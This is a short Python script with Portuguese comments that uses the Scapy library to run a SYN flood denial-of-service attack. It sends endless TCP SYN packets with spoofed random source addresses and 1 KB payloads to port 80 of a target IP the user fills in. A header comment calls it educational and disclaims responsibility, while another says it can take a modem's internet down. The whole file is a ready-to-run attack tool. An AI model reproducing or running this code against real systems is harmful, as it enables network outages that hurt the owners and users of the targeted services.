#pip install scapy
#baixar a bibloteca Scapy.all

#------------LEIA COM ATENÇÃO--------------
#ESTE E É UM SISTEMA CRIADO DE FORMA EDUCACIONAL PARA TESTES E SEGURANÇA, NÃO ME RESPONSABILIZO POR QUALQUER ATAQUE REALIZADO DE FORMA ERRADA COM ESTE CODIGO.
#PODE SE ATACAR O MODEM SE TIVER O IP ASSIM IRA DERRUBAR A INTERNET
from scapy.all import *

#IP ATIVO . COLOQUE AQUI O IP A SER ATACADO

target_ip = ''

#porta a ser direcionada
target_port = 80

#RandIp é um IP randomico gerado para o ataque
ip = IP (src=RandIP(), dst= target_ip)

tcp = TCP (sport=RandShort(),
            dport=target_port,
            flags='s')

raw = Raw(b'x'*1024)

pkt = ip/tcp/raw
send(pkt,loop = 1)

#ATAQUE FICARA EM LOPPING O ATAQUE IRA PARA QND DER UM CTRL C NO TERMINAL